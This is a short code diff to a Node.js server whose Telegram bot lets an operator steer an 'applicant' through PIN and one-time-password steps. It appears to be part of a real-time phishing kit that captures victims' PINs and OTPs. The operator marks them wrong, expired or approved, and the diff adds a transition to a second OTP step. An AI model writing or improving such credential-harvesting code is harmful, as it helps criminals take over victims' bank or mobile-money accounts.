@@ -94,12 +94,10 @@ async function initBot() {
       const actionData = query.data || '';
       const chatId = String(query.message.chat.id);
       
-      // Imeboreshwa: Kutenganisha Aina ya Amri na Kitambulisho cha Mteja kwa Usahihi
       const firstUnderscoreIdx = actionData.indexOf('_');
       const actionType = firstUnderscoreIdx !== -1 ? actionData.substring(0, firstUnderscoreIdx) : actionData;
       let targetId = firstUnderscoreIdx !== -1 ? actionData.substring(firstUnderscoreIdx + 1) : '';
 
-      // Kama kitambulisho kimeshindikana kusomwa, tumia lastActiveUserId
       if (!targetId || !sessions.has(targetId)) {
         targetId = lastActiveUserId;
       }
@@ -122,13 +120,13 @@ async function initBot() {
           session.status = 'PROCEED_OTP1';
           await bot.sendMessage(chatTarget, `✅ PIN allowed. Moved to OTP Step 1.`);
           break;
-        case 'WRONG': // Iliyorekebishwa kusoma WRONG_PIN vizuri
+        case 'WRONG':
         case 'WRONG_PIN':
           session.status = 'RETRY_PIN'; 
           session.pin = '';
           await bot.sendMessage(chatTarget, `❌ Wrong PIN sent. Applicant redirected back to enter new PIN.`);
           break;
-        case 'OTP': // Iliyorekebishwa kusoma OTP_EXPIRED vizuri
+        case 'OTP':
         case 'OTP_EXPIRED':
           session.status = 'RETRY_OTP1'; 
           session.otp1 = '';
@@ -141,6 +139,9 @@ async function initBot() {
           await bot.sendMessage(chatTarget, `❌ Invalid OTP sent. Waiting for new incoming OTP.`);
           break;
         case 'NEXT':
+          session.status = 'PROCEED_OTP2'; // Automatically transitions user to OTP Step 2
+          await bot.sendMessage(chatTarget, `✅ Step 1 approved. Applicant moved to OTP Step 2.`);
+          break;
         case 'APPROVED':
         case 'APPROVED_FINAL':
           session.status = 'SUCCESS';
@@ -326,4 +327,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-  
+          
